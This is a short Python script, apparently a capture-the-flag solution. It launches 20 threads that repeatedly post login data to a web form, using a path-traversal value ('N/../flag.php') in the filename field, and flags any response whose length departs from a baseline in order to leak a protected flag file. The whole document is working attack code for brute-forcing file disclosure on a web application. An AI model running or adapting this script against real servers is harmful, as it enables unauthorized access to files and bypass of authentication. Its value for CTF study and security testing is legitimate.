def Brute_With_Requests(url):
	import requests
	import threading
	def run(i):
		s = requests.Session()
		while True:
			data={'username': 'Admin', 'password': 'b', 'hash': '0', 'filename': '%d/../flag.php' % i, 'secret_password': 'b'}
			r = s.post(url, data)
			if len(r.text) != 5514:
				print r.text
				exit()
			i += len(ts)
	ts = []
	for i in range(20):
		t = threading.Thread(target=run, args=(i,))
		ts.append(t)
		t.start()

	for t in ts:
		t.join()